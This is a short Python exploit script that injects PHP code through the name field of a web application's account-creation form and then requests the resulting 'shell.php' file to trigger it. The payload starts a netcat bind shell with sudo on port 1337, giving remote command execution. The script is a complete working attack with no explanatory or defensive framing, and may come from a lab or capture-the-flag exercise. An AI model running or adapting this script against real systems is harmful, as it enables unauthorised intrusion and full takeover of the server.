#!/usr/bin/python3

import random
import requests
import string
import sys

def usage():
    print("Usage: acct_exploit.py <host>")
    sys.exit(1)

def randstr(len):
    return ''.join(random.choice(string.ascii_uppercase) for i in range(len))

def exploit(target, payload):
    email = randstr(8) + '@shell.php'
    post = {
        'first' : payload,
        'last' : '',
        'email' : email,
        'password' : '',
        'cc' : '4556726227195880',
        'exp' : '01/2015'
    }
    requests.post('http://' + target + '/createaccount.php', data=post)
    requests.get('http://' + target + '/users/' + email)

def main():
    if len(sys.argv) != 2:
        usage()
        
    host = sys.argv[1]
    payload = '<?php `sudo nc -lp 1337 -e /bin/bash`;?>'
    resp = exploit(host, payload)
        
if __name__ == '__main__':
    main()
        
        
    
